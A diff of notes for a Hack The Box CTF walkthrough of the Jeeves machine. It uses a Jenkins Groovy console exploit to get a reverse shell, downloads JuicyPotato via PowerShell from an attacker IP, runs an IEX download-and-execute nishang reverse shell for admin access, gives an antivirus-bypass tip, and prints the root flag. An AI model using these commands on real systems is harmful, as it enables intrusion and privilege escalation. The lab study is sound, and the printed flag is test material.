@@ -10,15 +10,17 @@ It directs to Jenkins page
 
 On the right-bottom cornet of the page, we can see current version of jenkins as 2.87 
 
-Use can groovy exploit code to get the user shell, which has less previlages
+Using groovy exploit code to get the user shell, which has less previlages --> https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76 --> Modify <IP Address> <Port> on the exploit, run it on jenkins console, use netcat listener on same port for getting user shell
 
 
 
-Winodows less previlages file transfer 
+Find out the permissions in using dir command
 
+on finding impersonation enabled for normal user, using JuicyPotato.exe we can exploit this
 
-powershell -c  "Invoke-WebRequest -Uri http://10.10.16.90:8081/JuicyPotato.exe -outFile C:\Users\kohsuke\Desktop\JP.exe"
+click "Download" symbol in browser and click extract --> to bypass anti-virus check in browser, else exploit file will be downloaded emptry (0 Bytes)
 
+File transfer => powershell -c  "Invoke-WebRequest -Uri http://10.10.16.90:8081/JuicyPotato.exe -outFile C:\Users\kohsuke\Desktop\JP.exe"
 
 Output folder with file name should be specified mandatorily 
 
@@ -26,23 +28,34 @@ Once the JuicyPotato.exe is moved into the target
 
 Now we need to download and move powershell script in ps1 format, which can be downloaded from 
 
-https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1  --> rename it to shell.ps1 
 
-rename it to shell.ps1 and transfer file to target system, if it doesn't work then rename to shell.bat
+Keep this shell.ps1 script in Kali machine -> add revershell command at end of the file Invoke-PowerShellTcp -Reverse -IPAddress <Kali IP> -Port <Any>
 
-powershell -c  "Invoke-WebRequest -Uri http://10.10.16.90:8081/adminshell.bat -outFile C:\Users\kohsuke\Desktop\adminshell.bat"
+Create a .BAT file as below
 
-powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.90:8000/shell1.ps1')"
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.90:8000/shell.ps1')" --> adminshell.bat
 
-Follow this blog for Previlage escalation using Executing the Juicy potato, it executres adminshell.bat (execture while file transfer and give admin shell)
+Move adminshell.bat to target
 
-Also it is so tricky to find the root.txt, 
+Now execute Juicy Potato EXE in the target, give the arguments -t * -p adminshell.bat -l <port in mentioned in shell.ps1 file)
 
-In desktop it is hidden inside hm.txt to we need to use alternate commands to get the root flag
+Use Netcar listender in Kali nc -nvlp <port mentioned in shell.ps1>
+
+So, now we got the admin shell, use whoami or systeminfo to conform it
+
+cd to Administrator/Deskop there you'll find hm.txt, which is not root
+
+root is in same Desktop directory but dir command will not display it, there are commands to get files in alternate data streams
+
+Use below set of commands to find the files from alternate streams and its contents, standard commands "dir" or "type" will not work here. 
+
 
 Find the HIDDEN root.txt exist -->Get-item -Path C:\Users\Administrator\Desktop\hm.txt -stream *
 Read contents from root.txt --> Get-Content -Path C:\Users\Administrator\Desktop\hm.txt -Stream root.txt
 afbc5bd4b615a60648cec41c6ac92530
+
+Walkthrough link --> https://pinecone.red/ctf/htb/windows/jeeves/jeeves.html
 
 
 
